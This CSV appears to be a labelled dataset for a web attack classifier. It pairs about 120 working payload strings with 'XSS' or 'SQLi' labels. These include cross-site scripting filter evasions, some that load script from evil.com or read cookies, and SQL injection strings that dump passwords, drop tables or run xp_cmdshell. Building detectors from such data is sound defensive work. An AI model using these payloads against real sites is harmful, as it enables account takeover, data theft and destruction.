"text","label"
"<script>alert('XSS')</script>","XSS"
"<img src=x onerror=alert(1)>","XSS"
"<svg/onload=alert(1)>","XSS"
"<iframe src='javascript:alert(1)'></iframe>","XSS"
"<a onmouseover=alert(1)>XSS</a>","XSS"
"<script>document.cookie</script>","XSS"
"<script src=http://evil.com/xss.js></script>","XSS"
"<body onload=alert('XSS')>","XSS"
"<input onfocus=alert(1) autofocus>","XSS"
"<select onfocus=alert(1) autofocus>","XSS"
"<textarea onfocus=alert(1) autofocus>","XSS"
"<keygen onfocus=alert(1) autofocus>","XSS"
"<video><source onerror=alert(1)>","XSS"
"<audio src=x onerror=alert(1)>","XSS"
"<details open ontoggle=alert(1)>","XSS"
"<marquee onstart=alert(1)>","XSS"
"<meter onmouseover=alert(1)>0</meter>","XSS"
"<object data=javascript:alert(1)>","XSS"
"<embed src=javascript:alert(1)>","XSS"
"<svg><animate onbegin=alert(1) attributeName=x dur=1s>","XSS"
"<math><mtext><script>alert(1)</script></mtext></math>","XSS"
"'';!--<XSS>=&{()}","XSS"
"<IMG SRC=javascript:alert('XSS')>","XSS"
"<IMG SRC=JaVaScRiPt:alert('XSS')>","XSS"
"<IMG SRC=`javascript:alert('XSS')`>","XSS"
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>","XSS"
"<IMG onmouseover=alert('XSS')>","XSS"
"<BODY ONLOAD=alert('XSS')>","XSS"
"<BGSOUND SRC=javascript:alert('XSS')>","XSS"
"<BR SIZE=&{alert('XSS')}>","XSS"
"<LINK REL=stylesheet HREF=javascript:alert('XSS')>","XSS"
"<STYLE>@import'http://evil.com/xss.css';</STYLE>","XSS"
"<META HTTP-EQUIV=refresh CONTENT='0;url=javascript:alert(1)'>","XSS"
"<IFRAME SRC=javascript:alert('XSS')></IFRAME>","XSS"
"<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAMESET>","XSS"
"<TABLE BACKGROUND=javascript:alert('XSS')>","XSS"
"<DIV STYLE=width:expression(alert('XSS'))>","XSS"
"<svg/onload=confirm(1)>","XSS"
"<img src=x onerror=prompt(1)>","XSS"
"<body onpageshow=alert(1)>","XSS"
"<style>@keyframes x{}</style><xss style=animation-name:x onanimationend=alert(1)></xss>","XSS"
"<iframe src=javascript:alert(1)>","XSS"
"<input onblur=alert(1) autofocus><input autofocus>","XSS"
"<math href=javascript:alert(1)>CLICKME</math>","XSS"
"';alert(1)//","XSS"
"\;alert(1)//""","XSS"
"javascript://%250Aalert(1)","XSS"
"<a href='javascript:alert(1)'>Click</a>","XSS"
"<form action='javascript:alert(1)'>","XSS"
"<isindex type=image src=1 onerror=alert(1)>","XSS"
"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>","XSS"
"<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>","XSS"
"%3Cscript%3E","XSS"
"<svg onload=alert(document.domain)>","XSS"
"<img src=x onerror=alert(document.cookie)>","XSS"
"<details open ontoggle=confirm(1)>","XSS"
"<marquee onfinish=alert(1)>","XSS"
"<video src=x onerror=alert(1)>","XSS"
"<xss id=x tabindex=1 onfocus=alert(1)></xss>","XSS"
"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>","XSS"
"<svg><set attributeName=onmouseover to=alert(1)>","XSS"
"<body onscroll=alert(1)><div style=height:9999px></div>","XSS"
"<form><button formaction=javascript:alert(1)>XSS","XSS"
"' OR 1=1--","SQLi"
"1; SELECT * FROM users--","SQLi"
"UNION SELECT 1,2,3--","SQLi"
"'; DROP TABLE users--","SQLi"
"SELECT 1,2,3 FROM users","SQLi"
"1' OR '1'='1","SQLi"
"1' OR '1'='1' --","SQLi"
"1' OR '1'='1' /*","SQLi"
"admin' --","SQLi"
"admin' #","SQLi"
"admin'/*","SQLi"
"' or 1=1--","SQLi"
"' or 1=1#","SQLi"
"' or 1=1/*","SQLi"
"') or '1'='1--","SQLi"
"') or ('1'='1--","SQLi"
"1' ORDER BY 1--","SQLi"
"1' ORDER BY 2--","SQLi"
"1' ORDER BY 3--","SQLi"
"1' GROUP BY 1--","SQLi"
"1' GROUP BY 2--","SQLi"
"1' UNION SELECT NULL--","SQLi"
"1' UNION SELECT NULL,NULL--","SQLi"
"1' UNION SELECT NULL,NULL,NULL--","SQLi"
"1' UNION ALL SELECT NULL--","SQLi"
"1' UNION ALL SELECT NULL,NULL--","SQLi"
"1' AND 1=2 UNION SELECT NULL--","SQLi"
"' UNION SELECT password FROM users--","SQLi"
"' UNION SELECT username,password FROM users--","SQLi"
"1'; DROP TABLE users--","SQLi"
"1'; DELETE FROM users--","SQLi"
"1'; UPDATE users SET password='hacked'--","SQLi"
"1'; INSERT INTO users VALUES('hacker','pass')--","SQLi"
"1'; EXEC xp_cmdshell('dir')--","SQLi"
"1' AND 1=CONVERT(int,(SELECT @@version))--","SQLi"
"1' AND 1=CAST((SELECT @@version) as int)--","SQLi"
"1' AND SUBSTRING(@@version,1,1)='M'--","SQLi"
"1' AND ASCII(SUBSTRING(@@version,1,1))>77--","SQLi"
"1' WAITFOR DELAY '0:0:5'--","SQLi"
"1'; WAITFOR DELAY '0:0:5'--","SQLi"
"1' AND SLEEP(5)--","SQLi"
"1'; SELECT SLEEP(5)--","SQLi"
"1' AND BENCHMARK(5000000,MD5('A'))--","SQLi"
"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","SQLi"
"1' AND IF(1=1,SLEEP(5),0)--","SQLi"
"1' OR SLEEP(5)--","SQLi"
"1' RLIKE SLEEP(5)--","SQLi"
"1' REGEXP SLEEP(5)--","SQLi"
"admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--","SQLi"
"admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--","SQLi"
"1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--","SQLi"
